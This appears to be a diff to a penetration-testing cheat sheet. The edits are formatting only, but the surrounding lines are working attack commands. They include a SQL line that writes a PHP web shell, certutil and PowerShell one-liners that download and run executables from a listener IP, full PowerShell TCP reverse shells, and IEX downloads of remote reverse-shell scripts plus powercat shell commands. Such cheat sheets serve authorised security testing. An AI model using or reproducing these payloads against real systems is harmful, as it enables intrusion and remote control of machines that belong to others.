@@ -47,7 +47,7 @@ SELECT '<?php passthru($_GET[cmd]);?>' INTO OUTFILE '<file_location>/<filename>'
 
 **Internet**
 
-- [portquiz](http://portquiz.net/)
+[portquiz](http://portquiz.net/)
 
 **local** 
 
@@ -68,19 +68,15 @@ certutil -urlcache -split -f http://<listener_ip>:1234/shell.exe C:\Windows\Temp
 
 ```bash
 Invoke-WebRequest -Uri "http://<listener_ip>:1234/nc.exe" -OutFile "nc.exe" & .\nc.exe -e cmd.exe <listener_ip> 1234
-
 echo Invoke-WebRequest -Uri http://<listener_ip>:1234/revshell.exe -Outfile c:\windows\temp\revshell.exe | powershell -noprofile
-
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<listener_ip>:1234/shell.ps1')|iex"
-
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<listener_ip>",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<listener_ip>',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 
 # Powercat
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+
 powercat -c <listener_ip> -p 1234 -e cmd.exe
 
 powercat -c <listener_ip> -p 1234 -e cmd.exe -g > reverse.ps1
